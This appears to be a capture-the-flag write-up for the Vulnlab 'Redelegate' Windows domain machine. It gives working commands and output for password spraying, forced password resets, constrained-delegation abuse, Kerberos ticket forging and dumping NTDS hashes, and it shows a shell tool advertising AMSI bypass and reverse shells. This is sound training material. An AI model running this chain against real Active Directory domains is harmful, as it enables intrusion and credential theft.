---
layout: post
title:  "[VL] Redelegate"
categories: [Machines]
description: Hard Windows
tags: [vulnlab, windows, hard]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2dd7e45185bff1d1aba95b4836311df3.png
---

## Machine Information

TARGET_IP: 10.129.16.246 \\
ATTACKER_IP: 10.10.16.48

## User Part
### Initial Enumeration and Configuration

```shell
$ rustscan -a 10.129.16.246 --top -- -sV -Pn -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<SNIP...>

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-05 16:55:51Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-03-05T16:56:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Issuer: commonName=dc.redelegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-04T16:53:19
| Not valid after:  2026-09-03T16:53:19
| MD5:   d0f06402421ed223b0475816f17d01d3
| SHA-1: 936a7cbb787f442b7b4e9eaad1f11cece342db19
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQEskeM7WjZqxPAzMxeVdQhDANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBkYy5yZWRlbGVnYXRlLnZsMB4XDTI2MDMwNDE2NTMxOVoXDTI2
| MDkwMzE2NTMxOVowGzEZMBcGA1UEAxMQZGMucmVkZWxlZ2F0ZS52bDCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAJ9LgmM9uWH3M77/2rHpUV1pi1pp2YiV
| rkASLUJiNhuZrFhZW4iZHet59LU1r3RtMzmuRKFbBoj7eVgC8JUDII4HW+J+FKki
| 2quQg0sc/v56bAcauE7RjDgxmCLqVRoVzZjBFpr0Fu9MsOKj/Pp34eFOuw411so1
| oTzZlqe/EHl4yPlkrA8DA7kLvkbRt5TUDO8URHbDq1qlq7dwmgKeVla1vGmzca5G
| 8XCZr4qoTP70kIWlqC0Uy8+Dein4b7Y7RryO9aXV7OcqGsOUNgEaCeTcP6K4JaiS
| JoBMKJ0w7nptk3j7+qnogmUOaORQ5k0v6b6rqO2xgPAhTvurA5WyQz0CAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQCXsPPgt6sVDewz5+dxdm1QQnzwhL2vs70RP4vuHPK9Cmo5XtOFICKH
| zQTJt3+dvW2LvkUXfkoydFs7XB5RMbkvAd4d+urKsZGuQsy3CiKw9yM53rgQu20P
| bOAyZpAMNuXbhaeaugkh07Iu+t6IlDPbs7hOgHmLZSY5uPWX0zDulqM2V3br7Aqw
| /wobkZqOGzoTVxiJGqAleJIHg6Or9YRqL3T9QpOEk8TRGbO39NKbbv/LEuYyhItk
| lzskw5NgMgxTux/IHGbZuX33Oh7lYdQn/Kn5rJTH9Uh6Khfs1EHBDxM9hEZ/KoSY
| mxDZuuUB6aWq/s+QuMnJj6fCtqUlPEzM
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-05T16:56:50+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50391/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
50392/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51003/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51007/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51019/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51021/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52486/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```


```shell
$ nxc smb 10.129.16.246 --generate-hosts-file /etc/hosts 
SMB         10.129.16.246   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)

$ nxc smb 10.129.16.246 --generate-krb5-file /etc/krb5.conf 
SMB         10.129.16.246   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
```

Looking at the nmap scan, we see that there is an FTP service, allowing anonymous login. 

### FTP

```shell
$ ftp 10.129.16.246
Connected to 10.129.16.246.
220 Microsoft FTP Service
Name (10.129.16.246:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62164|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: CyberAudit.txt remote: CyberAudit.txt
229 Entering Extended Passive Mode (|||62167|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************|   434        3.45 KiB/s    00:00 ETA
226 Transfer complete.
434 bytes received in 00:00 (3.00 KiB/s)
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||62168|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************|  2622       28.63 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (23.60 KiB/s)
local: TrainingAgenda.txt remote: TrainingAgenda.txt
229 Entering Extended Passive Mode (|||62169|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************|   580        4.56 KiB/s    00:00 ETA
226 Transfer complete.
580 bytes received in 00:00 (3.91 KiB/s)
ftp> exit
221 Goodbye.
```

We got one KeePass file, protected by a password, and 2 TXT files. 
```
$ cat TrainingAgenda.txt 
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them


$ cat CyberAudit.txt    
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

Looking at them we see that "SeasonYear!" is a bad password. Let's try it on the KeePass file !

October 2024 -> Autumn2024! / Fall2024! 


```shell
$ keepassxc-cli export -f csv Shared.kdbx
Enter password to unlock Shared.kdbx: Fall2024!
KdbxXmlReader::readDatabase: found 1 invalid group reference(s)
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"Shared/IT","FTP","FTPUser","SguPZBKdRyxWzvXRWy6U","","Deprecated","","0","2024-10-20T07:56:58Z","2024-10-20T07:56:20Z"
"Shared/IT","FS01 Admin","Administrator","Spdv41gg4BlBgSYIW1gF","","","","0","2024-10-20T07:57:21Z","2024-10-20T07:57:02Z"
"Shared/IT","WEB01","WordPress Panel","cn4KOEgsHqvKXPjEnSD9","","","","0","2024-10-20T08:00:25Z","2024-10-20T07:57:24Z"
"Shared/IT","SQL Guest Access","SQLGuest","zDPBpaF4FywlqIv11vii","","","","0","2024-10-20T08:27:09Z","2024-10-20T08:26:48Z"
"Shared/HelpDesk","KeyFob Combination","","22331144","","","","0","2024-10-20T12:12:32Z","2024-10-20T12:12:09Z"
"Shared/Finance","Timesheet Manager","Timesheet","hMFS4I0Kj8Rcd62vqi5X","","","","0","2024-10-20T12:14:18Z","2024-10-20T12:13:30Z"
"Shared/Finance","Payrol App","Payroll","cVkqz4bCM7kJRSNlgx2G","","","","0","2024-10-20T12:14:11Z","2024-10-20T12:13:50Z"
```

Bingo ! Here the information we got : 

`FTPUser`:`SguPZBKdRyxWzvXRWy6U` \
`Administrator`:`Spdv41gg4BlBgSYIW1gF` (FS01) \
`WordPress Panel`:`cn4KOEgsHqvKXPjEnSD9` (WEB01) \
`SQLGuest`:`zDPBpaF4FywlqIv11vii` \
`Timesheet`:`hMFS4I0Kj8Rcd62vqi5X` \
`Payroll`:`cVkqz4bCM7kJRSNlgx2G` 


### MSSQL
By testing the creds for `SQLGuest`, we see that I can connect to the MSSQL server with them. 

```
$ nxc mssql 10.129.16.246 -u SQLGuest  -p 'zDPBpaF4FywlqIv11vii' --local-auth
MSSQL       10.129.16.246   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.16.246   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
```

After looking to the MSSQL server itself, there is no interesting misconfig. So I am just gonna use this account to make a wordlist by bruteforcing the RID. 

```shell
$ nxc mssql 10.129.16.246 -u SQLGuest  -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute | awk '{print $6}'  | sed 's/^REDELEGATE\\//' > users.txt

$ cat users.txt
SQLGuest
Administrator
Guest
krbtgt
SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
DC$
FS01$
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Ryan.Cooper
sql_svc

$ cat passwords.txt 
SguPZBKdRyxWzvXRWy6U
Spdv41gg4BlBgSYIW1gF
cn4KOEgsHqvKXPjEnSD9
hMFS4I0Kj8Rcd62vqi5X
zDPBpaF4FywlqIv11vii
cVkqz4bCM7kJRSNlgx2G
Fall2024!
```

Now I am gonna password spray 

```shell
$ nxc smb 10.129.16.246 -u users.txt -p passwords.txt --continue-on-success
SMB         10.129.16.246   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
<SNIP...>
SMB         10.129.16.246   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!
```
We got new working creds :
`marie.curie`:`Fall2024!`

### BloodHound
Since we got a valid domain user, we can use it to collect information using LDAP.

```shell
nxc ldap 10.129.16.246 -u marie.curie -p 'Fall2024!' --dns-tcp --dns-server 10.129.16.246 --bloodhound -c All
LDAP        10.129.16.246   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.16.246   389    DC               [+] redelegate.vl\marie.curie:Fall2024! 
LDAP        10.129.16.246   389    DC               Resolved collection methods: objectprops, group, rdp, container, psremote, session, acl, localadmin, dcom, trusts
LDAP        10.129.16.246   389    DC               Done in 0M 9S
LDAP        10.129.16.246   389    DC               Compressing output into /root/.nxc/logs/DC_10.129.16.246_2026-03-05_191535_bloodhound.zip
```
`marie.curie` has ForceChangePassword right over some other users.
![alt text](/assets/images/redelegate/1.png)
By looking at who is the most important user between them, we see that `helen.frost` has GenericAll right over `FS01$` and is member of `Remote Management Users` group.
![alt text](/assets/images/redelegate/2.png)

![alt text](/assets/images/redelegate/3.png)

This is the user we are gonna target.
### Get User Flag
First we take control of the user by changing its password
```shell
$ bloodyAD --host 10.129.16.246 -d redelegate.vl -u marie.curie -p 'Fall2024!' set password helen.frost Password123 
[+] Password changed successfully!
```
Then we connect to the DC using WinRM. 
```shell
evil-winrm -u helen.frost -p Password123 -i 10.129.16.246
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> ls


    Directory: C:\Users\Helen.Frost\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          3/5/2026   8:54 AM             34 user.txt


*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> cat user.txt
9919[REDACTED]
```

## Root Part

```
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
```
`helen.frost` has SeEnableDelegationPrivilege enabled, we can use it to create a constrained delegation over the DC.

### Change FS01$ Password

```shell
$ bloodyAD --host 10.129.16.246 -d redelegate.vl -u helen.frost -p 'Password123' set password FS01$ Password123
[+] Password changed successfully!
```


### Add TRUSTED_TO_AUTH_FOR_DELEGATION flag

```shell
$ bloodyAD --host 10.129.16.246 -d redelegate.vl -u helen.frost -p 'Password123' add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

### Add msDS-AllowedToDelegateTo flag 

```shell
$ bloodyAD --host 10.129.16.246 -d redelegate.vl -u helen.frost -p 'Password123' set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl' 
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

### Delegate
```shell
$ getST.py 'redelegate.vl'/'FS01$':'Password123' -spn cifs/dc.redelegate.vl -impersonate dc 
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

### Dump NTDS

```shell
$ export KRB5CCNAME=dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache

$ nxc smb 10.129.16.246 --use-kcache --ntds --user Administrator
MB         10.129.16.246   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.16.246   445    DC               [+] redelegate.vl\dc from ccache 
SMB         10.129.16.246   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.16.246   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
```

### Get Root Flag
I got some issue using evil-winrm, so I will use [this](https://github.com/uziii2208/PwnRM) tool instead.

```shell
pwnrm redelegate.vl/Administrator@10.129.16.246 -hashes :ec17f7a2a4d96e177bfd101b94ffc0a7
 ____  _      _      ____  _     
╱  __╲╱ ╲  ╱│╱ ╲  ╱│╱  __╲╱ ╲__╱│  GitHub: uziii2208
│  ╲╱││ │  │││ │╲ │││  ╲╱││ │╲╱││  =====================================================================
│  __╱│ │╱╲│││ │ ╲│││    ╱│ │  ││  [+] A WinRM remote management shell with upload/download,
╲_╱   ╲_╱  ╲│╲_╱  ╲│╲_╱╲_╲╲_╱  ╲│  amsi bypass, .NET assembly execution, and reverse shell capabilities.
                                 


Ctrl+D to exit, Ctrl+C will gracefully interrupt the current operation
Note: This is a command shell, not a fully interactive terminal!
For interactive programs or processes expecting stdin input, use !revshell

Available Commands:
  !download RPATH [LPATH]          # Retrieve a file/directory from target (directories
                                   # are compressed as ZIP); quote paths containing spaces

  !upload [-xor] LPATH [RPATH]     # Send a file to target; optionally encrypt with XOR
                                   # for use with !psrun/!netrun; slower than direct transfer
                                   # Consider using IWR if network connectivity permits

  !amsi                            # Disable AMSI (run before loading .NET assemblies)

  !psrun [-xor] URL                # Execute PowerShell script via URL; uses obfuscated
                                   # script block execution to bypass AMSI if needed
                                   # Use -xor flag when loading XOR-encrypted scripts

  !netrun [-xor] URL [ARG] [ARG]   # Execute .NET assembly from URL with optional arguments
                                   # Run !amsi first if encountering format errors
                                   # Use -xor flag for encrypted assemblies

  !revshell IP PORT                # Establish reverse shell with full stdin/stdout/stderr
                                   # Use for processes requiring interactive I/O
                                   # Example stdin redirection:
                                   # PS> Set-Content -Encoding ASCII 'input.txt' "data"
                                   # PS> Start-Process prog.exe -RedirectStandardInput 'input.txt'

  !log                             # Enable session logging to pwnrm_[timestamp]_stdout.log
  !stoplog                         # Disable session logging

ENJOY YOUR MEAL :)
PS C:\Users\Administrator\Documents> cd ../Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---          3/5/2026   8:54 AM             34 root.txt                                                              


PS C:\Users\Administrator\Desktop> cat root.txt
4c6b[REDACTED]
```